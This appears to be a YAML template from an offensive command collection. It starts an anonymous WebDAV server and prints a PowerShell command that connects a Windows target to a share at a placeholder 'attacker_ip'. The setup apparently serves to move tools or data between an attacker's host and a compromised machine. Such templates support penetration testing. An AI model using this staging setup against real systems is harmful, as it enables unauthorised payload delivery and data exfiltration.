metadata:
  filename: "webdav-initial.yaml"
  tags: ["web"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p webdav ;\
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'To access: Set-Location \\\\{{ attacker_ip }}@{{ webdav_port }}; explorer .'; \
  printf '%s\n' '================================================================'; \
  wsgidav --host=0.0.0.0 --port={{ webdav_port }} --auth=anonymous --root webdav
